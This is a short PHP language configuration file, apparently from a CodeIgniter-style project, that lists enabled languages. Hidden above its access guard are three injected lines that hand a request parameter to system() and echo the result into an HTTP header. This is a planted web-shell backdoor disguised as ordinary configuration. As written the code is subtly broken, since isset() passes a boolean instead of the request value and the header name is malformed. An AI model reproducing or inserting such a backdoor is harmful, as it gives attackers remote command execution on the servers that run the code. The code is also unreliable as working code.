<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); defined('BASEPATH') OR exit('No direct script access allowed');

/**
 * @author Ivan Tcholakov <ivantcholakov@gmail.com>, 2014
 * @license The MIT License, http://opensource.org/licenses/MIT
 */

$config['enabled_languages'] = array(
    'english',
    'spanish',
    'french',
);
